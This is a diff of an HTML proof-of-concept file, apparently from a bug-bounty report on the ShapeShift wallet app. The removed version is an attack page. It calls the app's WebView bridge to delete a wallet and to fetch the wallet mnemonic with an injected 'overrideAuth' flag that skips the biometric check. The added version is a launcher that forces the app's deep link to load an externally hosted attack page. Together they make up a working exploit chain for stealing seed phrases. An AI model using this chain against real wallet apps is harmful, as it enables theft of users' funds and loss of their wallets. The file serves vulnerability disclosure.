@@ -1,62 +1,15 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PoC Attack Page</title>
+    <title>Deep Link Launcher</title>
+    <meta http-equiv="refresh" content="1; url=shapeshift://external-link-handler?url=https://mywork-bugbounty.github.io/host/poc.html">
 </head>
 <body>
-    <h1>ShapeShift PoC Attack Page</h1>
-    <p>Testing unauthorized wallet access via WebView bridge.</p>
-    
-    <button onclick="testDeleteWallet()">Test 1: Delete Wallet (DoS)</button>
-    <button onclick="testBiometricBypass()">Test 2: Biometric Bypass (Mnemonic Theft)</button>
-
-    <script>
-        const TARGET_WALLET_ID = '1'; // Assuming a wallet has been imported with ID '1'
-
-        // Function to send a message to the React Native Bridge
-        function sendCommand(command, payload = {}) {
-            const message = {
-                cmd: command,
-                ...payload
-            };
-            
-            const messageString = JSON.stringify(message);
-            console.log('Sending command:', messageString);
-            
-            // This global object is injected by react-native-webview
-            if (window.ReactNativeWebView) {
-                window.ReactNativeWebView.postMessage(messageString);
-            } else {
-                alert('ReactNativeWebView bridge not found. Run in target app.');
-            }
-        }
-
-        // --- Test 1: Denial of Service (DoS) ---
-        function testDeleteWallet() {
-            // Calls: messageManager.on('deleteWallet', evt => walletManager.delete(evt.key))
-            // Should prompt for Biometric/PIN, but is not implemented in the bridge.
-            sendCommand('deleteWallet', { key: TARGET_WALLET_ID });
-            alert('Command to delete wallet sent. Check app state.');
-        }
-
-        // --- Test 2: Critical Biometric Bypass (Mnemonic Theft) ---
-        function testBiometricBypass() {
-            // Calls: messageManager.on('getWallet', async evt => walletManager.getWalletWithMnemonic(evt.key))
-            // We exploit parameter mapping by injecting the 2nd argument: overrideAuth
-            sendCommand('getWallet', { 
-                key: TARGET_WALLET_ID, 
-                // CRITICAL: We pass the second function argument to bypass the biometric check
-                overrideAuth: true 
-            });
-            alert('Command to bypass auth and retrieve mnemonic sent. Check Logcat for data leak.');
-        }
-        
-        // Listener to catch the response from the RN app (if any data is returned)
-        document.addEventListener('message', (event) => {
-            console.log('Received response from RN:', event.data);
-            alert('Mnemonic Theft Result (Check Console/Logcat): ' + event.data);
-        });
-
-    </script>
+    <p>Attempting to launch ShapeShift...</p>
+    <a href="shapeshift://external-link-handler?url=https://mywork-bugbounty.github.io/host/poc.html">Click here if app does not launch</a>
+    <script>
+        // Fallback script to launch the URI directly
+        window.location.replace("shapeshift://external-link-handler?url=https://mywork-bugbounty.github.io/host/poc.html");
+    </script>
 </body>
 </html>
